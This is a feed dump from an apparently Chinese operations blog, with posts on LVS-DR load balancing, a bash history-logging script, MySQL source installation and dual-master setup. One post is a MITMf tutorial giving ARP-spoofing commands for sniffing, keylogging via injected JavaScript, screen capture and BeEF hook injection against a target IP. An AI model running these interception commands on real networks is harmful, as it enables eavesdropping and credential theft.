</p><table><thead><tr><th>主机名</th><th>ip</th><th>系统</th><th>用途</th></tr></thead><tbody><tr><td>client</td><td>172.16.147.1</td><td>mac</td><td>客户端</td></tr><tr><td>lvs-server</td><td>172.16.147.154</td><td>centos7.5</td><td>分发器</td></tr><tr><td>real-server1</td><td>172.16.147.155</td><td>centos7.5</td><td>web1</td></tr><tr><td>real-server2</td><td>172.16.147.156</td><td>centos7.5</td><td>web2</td></tr><tr><td>vip for dr</td><td>172.16/147.200</td><td>（真实场景是公网ip）</td><td></td></tr></tbody></table><h6 id="2、LVS-DR模式实施"><a href="#2、LVS-DR模式实施" class="headerlink" title="2、LVS/DR模式实施"></a>2、LVS/DR模式实施</h6><p>1、准备工作（集群中所有主机）关闭防火墙和selinux</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@lvs-server ~]# cat /etc/hosts</span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">172.16.147.154 lvs-server</span><br><span class="line">172.16.147.155 real-server1</span><br><span class="line">172.16.147.156 real-server2</span><br></pre></td></tr></table></figure><p>2、Director分发器配置</p><p>配置VIP</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@lvs-server ~]# ip addr add dev ens33 172.16.147.200/32 #设置VIP</span><br><span class="line">[root@lvs-server ~]# yum install -y ipvsadm   #RHEL确保LoadBalancer仓库可用</span><br><span class="line">[root@lvs-server ~]# service ipvsadm start  #启动</span><br><span class="line">注意:启动如果报错: /bin/bash: /etc/sysconfig/ipvsadm: 没有那个文件或目录</span><br><span class="line">需要手动生成文件</span><br><span class="line">[root@lvs-server ~]# ipvsadm --save &gt; /etc/sysconfig/ipvsadm</span><br></pre></td></tr></table></figure><p>定义LVS分发策略</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-A：添加VIP</span><br><span class="line">-t：用的是tcp协议</span><br><span class="line">-a：添加的是lo的vip地址</span><br><span class="line">-r：转发到realserverip</span><br><span class="line">-s：算法</span><br><span class="line">-L|-l –list #显示内核虚拟服务器表</span><br><span class="line">--numeric, -n：#以数字形式输出地址和端口号</span><br><span class="line">-g --gatewaying #指定LVS工作模式为直接路由器模式（也是LVS默认的模式）</span><br><span class="line">-S -save #保存虚拟服务器规则到标准输出，输出为-R 选项可读的格式</span><br><span class="line">rr：轮循</span><br><span class="line">如果添加ip错了，删除命令如下:</span><br><span class="line"><span class="meta">#</span><span class="bash"> ip addr del 172.16.147.200 dev ens33</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@lvs-server ~]# ipvsadm -C  #清除内核虚拟服务器表中的所有记录。</span><br><span class="line">[root@lvs-server ~]# ipvsadm -A -t 172.16.147.200:80 -s rr </span><br><span class="line">[root@lvs-server ~]# ipvsadm -a -t 172.16.147.200:80 -r 172.16.147.155 -g </span><br><span class="line">[root@lvs-server ~]# ipvsadm -a -t 172.16.147.200:80 -r 172.16.147.156 -g  </span><br><span class="line">[root@lvs-server ~]# service ipvsadm save #保存方式一，使用下面的保存方式，版本7已经不支持了</span><br><span class="line">[root@lvs-server ~]# ipvsadm -S &gt; /etc/sysconfig/ipvsadm  #保存方式二，保存到一个文件中</span><br><span class="line">[root@lvs-server ~]# ipvsadm -ln</span><br><span class="line">IP Virtual Server version 1.2.1 (size=4096)</span><br><span class="line">Prot LocalAddress:Port Scheduler Flags</span><br><span class="line"><span class="meta">  -&gt;</span><span class="bash"> RemoteAddress:Port           Forward Weight ActiveConn InActConn</span></span><br><span class="line">TCP  172.16.147.100:80 rr</span><br><span class="line"><span class="meta">  -&gt;</span><span class="bash"> 172.16.147.155:80            Route   1      0          0</span>         </span><br><span class="line"><span class="meta">  -&gt;</span><span class="bash"> 172.16.147.156:80            Route   1      0          0</span>         </span><br><span class="line">     </span><br><span class="line">[root@lvs-server ~]# ipvsadm -L -n       </span><br><span class="line">[root@lvs-server ~]# ipvsadm -L -n --stats    #显示统计信息</span><br><span class="line">1. Conns    (connections scheduled)  已经转发过的连接数</span><br><span class="line">2. InPkts   (incoming packets)       入包个数</span><br><span class="line">3. OutPkts  (outgoing packets)       出包个数</span><br><span class="line">4. InBytes  (incoming bytes)         入流量（字节）  </span><br><span class="line">5. OutBytes (outgoing bytes)         出流量（字节）</span><br><span class="line">[root@lvs-server ~]# ipvsadm -L -n --rate#看速率</span><br><span class="line">1. CPS      (current connection rate)   每秒连接数</span><br><span class="line">2. InPPS    (current in packet rate)    每秒的入包个数</span><br><span class="line">3. OutPPS   (current out packet rate)   每秒的出包个数</span><br><span class="line">4. InBPS    (current in byte rate)      每秒入流量（字节）</span><br><span class="line">5. OutBPS   (current out byte rate)      每秒出流量（字节）</span><br></pre></td></tr></table></figure><p>3、所有RS配置</p><p>配置好网站服务器，测试所有RS    #为了测试效果，提供不同的页面（以下两台real-server都操作）</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@real-server1 ~]# yum install -y nginx</span><br><span class="line">[root@real-server1 ~]# echo &quot;real-server1&quot; &gt;&gt; /usr/share/nginx/html/index.html</span><br><span class="line">两台机器都安装，按顺序添加不同的主机名以示区分</span><br><span class="line">[root@real-server1 ~]# ip addr add dev lo 172.16.147.200/32   #在lo接口上绑定VIP</span><br><span class="line">[root@real-server1 ~]# echo 1 &gt; /proc/sys/net/ipv4/conf/all/arp_ignore  #忽略arp广播</span><br><span class="line">[root@real-server1 ~]# echo 2 &gt; /proc/sys/net/ipv4/conf/all/arp_announce #匹配精确ip地址回包</span><br><span class="line">[root@real-server1 ~]# systemctl start nginx </span><br><span class="line">[root@real-server1 ~]# systemctl enable  nginx </span><br><span class="line">=============================================================================</span><br><span class="line">因为：realServer的vip有了，接着就是同一个网段中拥有两个vip, 客户端在网关发送arp广播需找vip时需要让realServer不接受响应.  </span><br><span class="line">解决：</span><br><span class="line">echo 1 &gt;/proc/sys/net/ipv4/conf/eth0/arp_ignore </span><br><span class="line">arp_ignore 设置为1，意味着当别人的arp请求过来的时候，如果接收的设备没有这个ip，就不做出响应(这个ip在lo上，lo不是接收设备的进口)</span><br><span class="line">echo 2 &gt;/proc/sys/net/ipv4/conf/eth0/arp_announce   </span><br><span class="line">使用最好的ip来回应，什么是最好的ip？同一个网段内子网掩码最长的</span><br></pre></td></tr></table></figure><h6 id="4、测试"><a href="#4、测试" class="headerlink" title="4、测试"></a>4、测试</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@client ~]# elinks -dump http:&#x2F;&#x2F;172.16.147.200</span><br></pre></td></tr></table></figure><h3 id="ipvsadm-使用攻略"><a href="#ipvsadm-使用攻略" class="headerlink" title="ipvsadm 使用攻略"></a>ipvsadm 使用攻略</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-A --add-service #在服务器列表中新添加一条新的虚拟服务器记录</span><br><span class="line">-s --scheduler #使用的调度算法， rr | wrr | lc | wlc | lblb | lblcr | dh | sh | sed | nq 默认调度算法是 wlc</span><br><span class="line">例：ipvsadm -A -t 192.168.1.2:80 -s wrr</span><br><span class="line"></span><br><span class="line">-a --add-server  #在服务器表中添加一条新的真实主机记录</span><br><span class="line">-t --tcp-service #说明虚拟服务器提供tcp服务</span><br><span class="line">-u --udp-service #说明虚拟服务器提供udp服务</span><br><span class="line">-r --real-server #真实服务器地址</span><br><span class="line">-m --masquerading #指定LVS工作模式为NAT模式</span><br><span class="line">-w --weight #真实服务器的权值</span><br><span class="line">-g --gatewaying #指定LVS工作模式为直接路由器模式（也是LVS默认的模式）</span><br><span class="line">-i --ip #指定LVS的工作模式为隧道模式  </span><br><span class="line">-p #会话保持时间，定义流量被转到同一个realserver的会话存留时间</span><br><span class="line">例：ipvsadm -a -t 192.168.1.2:80 -r 192.168.2.10:80 -m -w 1</span><br><span class="line"></span><br><span class="line">-E -edit-service #编辑内核虚拟服务器表中的一条虚拟服务器记录。</span><br><span class="line">-D -delete-service #删除内核虚拟服务器表中的一条虚拟服务器记录。</span><br><span class="line">-C -clear #清除内核虚拟服务器表中的所有记录。</span><br><span class="line">-R -restore #恢复虚拟服务器规则</span><br><span class="line">-S -save #保存虚拟服务器规则到标准输出，输出为-R 选项可读的格式</span><br><span class="line">-e -edit-server #编辑一条虚拟服务器记录中的某条真实服务器记录</span><br><span class="line">-d -delete-server #删除一条虚拟服务器记录中的某条真实服务器记录</span><br><span class="line">-L|-l –list #显示内核虚拟服务器表</span><br><span class="line"></span><br><span class="line">--numeric, -n：#以数字形式输出地址和端口号</span><br><span class="line">--exact： #扩展信息，精确值 </span><br><span class="line">--connection，-c： #当前IPVS连接输出</span><br><span class="line">--stats： #统计信息</span><br><span class="line">--rate ： #输出速率信息</span><br><span class="line"></span><br><span class="line">参数也可以从/proc/net/ip_vs*映射文件中查看</span><br><span class="line">-Z –zero #虚拟服务表计数器清零（清空当前的连接数量等）</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> lvs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> lvs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 历史命令优化脚本</title>
      <link href="2020/12/04/Linux-centos_%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4%E4%BC%98%E5%8C%96%E8%84%9A%E6%9C%AC/"/>
      <url>2020/12/04/Linux-centos_%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4%E4%BC%98%E5%8C%96%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">！/usr/bin/env bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">history</span></span></span><br><span class="line">USER_IP=`who -u am i 2&gt;/dev/null| awk &#x27;&#123;print $NF&#125;&#x27;|sed -e &#x27;s/[()]//g&#x27;`</span><br><span class="line">HISTDIR=/usr/share/.history</span><br><span class="line">if [ -z $USER_IP ]</span><br><span class="line">then</span><br><span class="line">USER_IP=`hostname`</span><br><span class="line">fi</span><br><span class="line">if [ ! -d $HISTDIR ]</span><br><span class="line">then</span><br><span class="line">mkdir -p $HISTDIR</span><br><span class="line">chmod 777 $HISTDIR</span><br><span class="line">fi</span><br><span class="line">if [ ! -d $HISTDIR/$&#123;LOGNAME&#125; ]</span><br><span class="line">then</span><br><span class="line">mkdir -p $HISTDIR/$&#123;LOGNAME&#125;</span><br><span class="line">chmod 300 $HISTDIR/$&#123;LOGNAME&#125;</span><br><span class="line">fi</span><br><span class="line">export HISTSIZE=4000</span><br><span class="line">DT=`date +%Y%m%d_%H%M%S`</span><br><span class="line">export HISTFILE=&quot;$HISTDIR/$&#123;LOGNAME&#125;/$&#123;USER_IP&#125;.history.$DT&quot;  #文件路径</span><br><span class="line">export HISTTIMEFORMAT=&quot;[%Y.%m.%d %H:%M:%S] &quot;                        #记录格式</span><br><span class="line">chmod 600 $HISTDIR/$&#123;LOGNAME&#125;/*.history* 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 开发 </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mitmf框架安装与使用</title>
      <link href="2020/12/04/mitmf_%E6%A1%86%E6%9E%B6%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
      <url>2020/12/04/mitmf_%E6%A1%86%E6%9E%B6%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="安装mitmf"><a href="#安装mitmf" class="headerlink" title="安装mitmf"></a>安装mitmf</h1><blockquote><p>环境介绍：<br>kali 2019-04<br>python 2.7</p></blockquote><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</span><br><span class="line">apt-get install libxml2-dev </span><br><span class="line"># 如果报错，可以自行百度更换源</span><br></pre></td></tr></table></figure><h3 id="克隆源代码"><a href="#克隆源代码" class="headerlink" title="克隆源代码"></a>克隆源代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;byt3bl33d3r&#x2F;MITMf</span><br><span class="line">cd MITMf &amp;&amp; git submodule init &amp;&amp; git submodule update --recursive</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><h3 id="安装-twisted"><a href="#安装-twisted" class="headerlink" title="安装 twisted"></a>安装 twisted</h3><blockquote><p>安装 twisted是为了完善功能</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;twistedmatrix.com&#x2F;Releases&#x2F;Twisted&#x2F;15.5&#x2F;Twisted-15.5.0.tar.bz2</span><br><span class="line">pip install .&#x2F;Twisted-15.5.0.tar.bz2</span><br></pre></td></tr></table></figure><h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><h6 id="数据包嗅探"><a href="#数据包嗅探" class="headerlink" title="数据包嗅探"></a>数据包嗅探</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python mitmf.py -i eth0 --hsts --spoof --arp --gateway 网关 --target 渗透ip</span><br></pre></td></tr></table></figure><h6 id="恶搞（图片调转180度）"><a href="#恶搞（图片调转180度）" class="headerlink" title="恶搞（图片调转180度）"></a>恶搞（图片调转180度）</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;mitmf.py --spoof --arp -i eth0 --gateway 网关 --target 渗透ip --upsidedownternet</span><br></pre></td></tr></table></figure><h6 id="图片替换"><a href="#图片替换" class="headerlink" title="图片替换"></a>图片替换</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;mitmf.py --spoof --arp -i eth0 --gateway 网关 --target 渗透ip --imgrand --img-dir &#x2F;root&#x2F;MITMf&#x2F;Photo      </span><br></pre></td></tr></table></figure><h6 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mitmf.py -i eth0 --spoof --arp --gateway 网关 --target 渗透ip --screen</span><br></pre></td></tr></table></figure><h6 id="键盘获取"><a href="#键盘获取" class="headerlink" title="键盘获取"></a>键盘获取</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;mitmf.py --spoof --arp -i eth0 --gateway 网关 --target 渗透ip --jskeylogger</span><br></pre></td></tr></table></figure><h6 id="与beef结合使用"><a href="#与beef结合使用" class="headerlink" title="与beef结合使用"></a>与beef结合使用</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;mitmf.py --spoof --arp -i eth0 --gateway 网关 --target 渗透ip --inject --js-url h</span><br><span class="line">ttp:&#x2F;&#x2F;127.0.0.1:3000&#x2F;hook.js</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 极客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql 5.7.24编译安装</title>
      <link href="2020/12/04/mysql_5.7.24%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85/"/>
      <url>2020/12/04/mysql_5.7.24%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h3 id="MySQL部署之源码安装"><a href="#MySQL部署之源码安装" class="headerlink" title="MySQL部署之源码安装"></a>MySQL部署之源码安装</h3><p><strong>注：</strong> <strong>相关依赖包的作用</strong></p><p><strong>cmake</strong>：<strong>由于从MySQL5.5版本开始弃用了常规的configure编译方法，所以需要CMake编译器，用于设置mysql的编译参数。如：安装目录、数据存放目录、字符编码、排序规则等。</strong></p><p><strong>Boost</strong>  #从MySQL 5.7.5开始Boost库是必需的，mysql源码中用到了C++的Boost库，要求必须安装</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">源码安装</span><br><span class="line">与二进制(RPM)发行版本相比，如果我们选择了通过源代码进行安装，那么在安装过程中我们能够对MySQL</span><br><span class="line">所做的调整将会更多更灵活一些。因为通过源代码编译我们可以：</span><br><span class="line">a) 针对自己的硬件平台选用合适的编译器来优化编译后的二进制代码；</span><br><span class="line">b) 根据不同的软件平台环境调整相关的编译参数；</span><br><span class="line">c) 针对我们特定应用场景选择需要什么组件不需要什么组件；</span><br><span class="line">d) 根据我们的所需要存储的数据内容选择只安装我们需要的字符集(utf-8)；</span><br><span class="line">e) 同一台主机上面可以安装多个MySQL；</span><br><span class="line"></span><br><span class="line">在源码安装给我们带来更大灵活性的同时，同样也给我们带来了可能引入的隐患：</span><br><span class="line">a) 对编译参数的不够了解造成编译参数使用不当可能使编译出来的二进制代码不够稳定；</span><br><span class="line">b) 对自己的应用环境把握失误而使用的优化参数可能反而使系统性能更差；</span><br><span class="line">c) 还有一个并不能称之为隐患的小问题就是源码编译安装将使安装部署过程更为复杂，所花费的时间更长；</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#所需要的依赖及安装mysql的包</span></span></span><br><span class="line">[root@mysql_source ~]# yum -y groupinstall &quot;Development Tools&quot; # 下载显示没有包，那就跳过这一步</span><br><span class="line">[root@mysql_source ~]# yum -y install ncurses ncurses-devel openssl-devel bison libgcrypt gcc gcc-c++ make cmake</span><br><span class="line">bison Linux下C/C++语法分析器</span><br><span class="line">ncurses：字符终端处理库</span><br><span class="line">[root@mysql_source ~]# wget https://dev.mysql.com/get/Downloads/MySQL-5.7/mysql-boost-5.7.24.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#在系统中添加运行mysqld进程的用户mysql</span></span></span><br><span class="line">[root@mysql_source ~]# groupadd mysql</span><br><span class="line">[root@mysql_source ~]# useradd -M -g mysql -s /sbin/nologin mysql</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#在系统中添加自定义mysql数据库目录及其他必要目录</span></span></span><br><span class="line">[root@mysql_source ~]# mkdir -p /usr/local/&#123;data,mysql,log,tmp&#125;</span><br><span class="line">[root@mysql_source ~]# chown -R mysql:mysql /usr/local/&#123;data,mysql,log,tmp&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#将mysql-boost-5.7.24.tar.gz解压到当前目录,并执行部署操作</span></span></span><br><span class="line">[root@mysql_source ~]# tar xf mysql-boost-5.7.24.tar.gz</span><br><span class="line">[root@mysql_source ~]# cd mysql-5.7.24</span><br><span class="line">[root@mysql_source mysql-5.7.24]# cmake . -DCMAKE_INSTALL_PREFIX=/usr/local/mysql \</span><br><span class="line">-DMYSQL_DATADIR=/usr/local/data \</span><br><span class="line">-DDEFAULT_CHARSET=utf8 \</span><br><span class="line">-DWITH_BOOST=boost/boost_1_59_0/ \</span><br><span class="line">-DCMAKE_INSTALL_PREFIX=/usr/local/mysql \</span><br><span class="line">-DSYSCONFDIR=/etc \</span><br><span class="line">-DINSTALL_MANDIR=/usr/share/man \</span><br><span class="line">-DMYSQL_TCP_PORT=3306 \</span><br><span class="line">-DMYSQL_UNIX_ADDR=/usr/local/tmp/mysql.sock \</span><br><span class="line">-DEXTRA_CHARSETS=all \</span><br><span class="line">-DDEFAULT_COLLATION=utf8_general_ci \</span><br><span class="line">-DWITH_READLINE=1 \</span><br><span class="line">-DWITH_SSL=system \</span><br><span class="line">-DWITH_EMBEDDED_SERVER=1 \</span><br><span class="line">-DENABLED_LOCAL_INFILE=1 \</span><br><span class="line">-DWITH_INNOBASE_STORAGE_ENGINE=1</span><br><span class="line"></span><br><span class="line">提示：boost也可以使用如下指令自动下载，如果不下载bost压缩包，把下面的这一条添加到配置中第二行</span><br><span class="line">-DDOWNLOAD_BOOST=1/</span><br><span class="line">参数详解:</span><br><span class="line">-DCMAKE_INSTALL_PREFIX=/usr/local/mysql \   安装目录</span><br><span class="line">-DSYSCONFDIR=/etc \   配置文件存放 （默认可以不安装配置文件）</span><br><span class="line">-DMYSQL_DATADIR=/usr/local/mysql/data \   数据目录   错误日志文件也会在这个目录</span><br><span class="line">-DINSTALL_MANDIR=/usr/share/man \     帮助文档 </span><br><span class="line">-DMYSQL_TCP_PORT=3306 \     默认端口</span><br><span class="line">-DMYSQL_UNIX_ADDR=/tmp/mysql.sock \  sock文件位置，用来做网络通信的，客户端连接服务器的时候用</span><br><span class="line">-DDEFAULT_CHARSET=utf8 \    默认字符集。字符集的支持，可以调</span><br><span class="line">-DEXTRA_CHARSETS=all \   扩展的字符集支持所有的</span><br><span class="line">-DDEFAULT_COLLATION=utf8_general_ci \  支持的</span><br><span class="line">-DWITH_READLINE=1 \    上下翻历史命令</span><br><span class="line">-DWITH_SSL=system \    使用私钥和证书登陆（公钥）  可以加密。 适用与长连接。坏处：速度慢</span><br><span class="line">-DWITH_EMBEDDED_SERVER=1 \   嵌入式数据库</span><br><span class="line">-DENABLED_LOCAL_INFILE=1 \    从本地倒入数据，不是备份和恢复。</span><br><span class="line">-DWITH_INNOBASE_STORAGE_ENGINE=1  默认的存储引擎，支持外键</span><br><span class="line">[root@mysql_source mysql-5.7.24]# echo $?</span><br><span class="line">0</span><br><span class="line">[root@mysql_source mysql-5.7.24]# make</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"><span class="meta">[100%</span><span class="bash">] Built target udf_example</span></span><br><span class="line">[root@mysql_source mysql-5.7.24]# echo $?</span><br><span class="line">0</span><br><span class="line">[root@mysql_source mysql-5.7.24]# make install</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">-- Installing: /usr/local/mysql/support-files/mysql.server</span><br><span class="line">[root@mysql_source mysql-5.7.24]# echo $?</span><br><span class="line">0</span><br><span class="line">[root@mysql_source mysql-5.7.24]#</span><br><span class="line">Congratulations Complete!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#初始化MySQL安装配置</span></span></span><br><span class="line">1.提升MySQL命令为系统级别命令</span><br><span class="line">[root@mysql_source ~]# echo &#x27;export PATH=$PATH:/usr/local/mysql/bin&#x27;&gt;&gt;/etc/profile</span><br><span class="line">[root@mysql_source ~]# source /etc/profile</span><br><span class="line"></span><br><span class="line">2.拷贝默认配置文件至/etc/my.cnf中</span><br><span class="line">[root@mysql_source mysql]# chown -R mysql.mysql /usr/local/&#123;data,mysql,log,tmp&#125;</span><br><span class="line">[root@mysql_source ~]# cd /usr/local/mysql/mysql-test/include</span><br><span class="line">[root@mysql_source include]# cp /etc/&#123;my.cnf,my.cnf.bak&#125;</span><br><span class="line">[root@mysql_source include]# cp default_mysqld.cnf /etc/my.cnf</span><br><span class="line">cp：是否覆盖&quot;/etc/my.cnf&quot;？ y</span><br><span class="line">[root@mysql_source include]# vim /etc/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">basedir = /usr/local/mysql                    #安装目录</span><br><span class="line">datadir = /usr/local/data #数据存放目录</span><br><span class="line">tmpdir = /usr/local/tmp #/tmp缓存目录</span><br><span class="line">socket = /usr/local/tmp/mysql.sock #指定socket文件的位置</span><br><span class="line">pid_file = /usr/local/tmp/mysqld.pid #指定pid文件的位置</span><br><span class="line">log_error = /usr/local/log/mysql_error.log #错误日志的位置</span><br><span class="line">slow_query_log_file = /usr/local/log/slow_warn.log  #慢日志查询</span><br><span class="line"></span><br><span class="line">server_id = 11#server-id=？？</span><br><span class="line">user = mysql#指定用户</span><br><span class="line">port = 3306#指定端口</span><br><span class="line">bind-address = 0.0.0.0#监听地址（允许所以ip访问）</span><br><span class="line">character-set-server = utf8#字符集</span><br><span class="line">default_storage_engine = InnoDB#引擎</span><br><span class="line"></span><br><span class="line">3.执行数据库服务初始化操作</span><br><span class="line">[root@mysql_source mysql]# mysqld --defaults-file=/etc/my.cnf --initialize --user=&#x27;mysql&#x27;</span><br><span class="line"></span><br><span class="line">4.启动mysqld服务</span><br><span class="line">[root@mysql_source mysql]# mysqld_safe --defaults-file=/etc/my.cnf &amp;  # 这种启动方法我们不用，我们使用脚本的方式启动，也就是我们的第五步。</span><br><span class="line">[1] 25705</span><br><span class="line">2019-8-18T09:19:35.334751Z mysqld_safe Logging to &#x27;/usr/local/log/mysql_error.log&#x27;.</span><br><span class="line">2019-8-18T09:19:35.379829Z mysqld_safe Starting mysqld daemon with databases from /usr/local/data</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果不小心执行了这一步启动，并且无法关闭掉，那么我们应该先去过滤初始密码 ，修改初始密码，然后使用 mysqladmin -uroot -p<span class="string">&#x27;密码&#x27;</span> shutdown 进行关闭，在后面的使用中，我们就是用管理工具进行启动或关闭。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#登录数据库并进行更改密码</span></span></span><br><span class="line">[root@mysql_source mysql]# grep &quot;password&quot; /usr/local/log/mysql_error.log</span><br><span class="line">2019-8-18T09:18:34.214401Z 1 [Note] A temporary password is generated for root@localhost: ejhszb2:m3wJ</span><br><span class="line">[root@mysql_source tmp]# mysql -uroot -p&quot;ejhszb2:m3wJ&quot;</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 2</span><br><span class="line">Server version: 5.7.24-log</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> alter user <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> identified by <span class="string">&quot;QianFeng@123&quot;</span>;</span></span><br><span class="line"></span><br><span class="line">5.配置mysqld服务的管理工具(便于启动)</span><br><span class="line">[root@mysql_source support-files]# cd /usr/local/mysql/support-files</span><br><span class="line">[root@mysql_source support-files]# cp mysql.server /etc/init.d/mysqld</span><br><span class="line">[root@mysql_source support-files]# chkconfig --add mysqld</span><br><span class="line">[root@mysql_source support-files]# chkconfig mysqld on</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动数据库</span>  </span><br><span class="line">[root@mysql_source support-files]# service mysqld start #重启就是restart # 关闭就是stop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql双主</title>
      <link href="2020/12/04/mysql_%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-%E5%8F%8C%E4%B8%BB(%E4%BA%92%E4%B8%BA%E4%B8%BB%E4%BB%8E)/"/>
      <url>2020/12/04/mysql_%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-%E5%8F%8C%E4%B8%BB(%E4%BA%92%E4%B8%BA%E4%B8%BB%E4%BB%8E)/</url>
      
        <content type="html"><![CDATA[<p>MySQL双主架构</p><table><thead><tr><th>主机名</th><th>ip</th><th>用途</th></tr></thead><tbody><tr><td>mysql-server1</td><td>192.168.10.11</td><td>主1</td></tr><tr><td>mysql-server2</td><td>192.168.10.12</td><td>主2</td></tr><tr><td>ps. 要求：</td><td></td><td></td></tr><tr><td>1、主从版本一致</td><td></td><td></td></tr><tr><td>2、主从数据一致</td><td></td><td></td></tr></tbody></table><h3 id="yum-方式安装mysql"><a href="#yum-方式安装mysql" class="headerlink" title="yum 方式安装mysql"></a>yum 方式安装mysql</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 两台服务器均安装mysql</span></span><br><span class="line">[root@mysql-server1 ~]# wget https://dev.mysql.com/get/mysql80-community-release-el7-3.noarch.rpm</span><br><span class="line">[root@mysql-server1 ~]# rpm -ivh mysql80-community-release-el7-3.noarch.rpm</span><br><span class="line">[root@mysql-server1 ~]# yum -y install yum-utils    #安装yum工具包</span><br><span class="line">[root@mysql-server1 ~]# vim /etc/yum.repos.d/mysql-community.repo   #修改如下</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200202145822539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@mysql-server1 ~]# yum install -y   mysql-community-server</span><br><span class="line">启动服务</span><br><span class="line">[root@mysql-server1 ~]# systemctl start mysqld</span><br><span class="line">设置开机启动</span><br><span 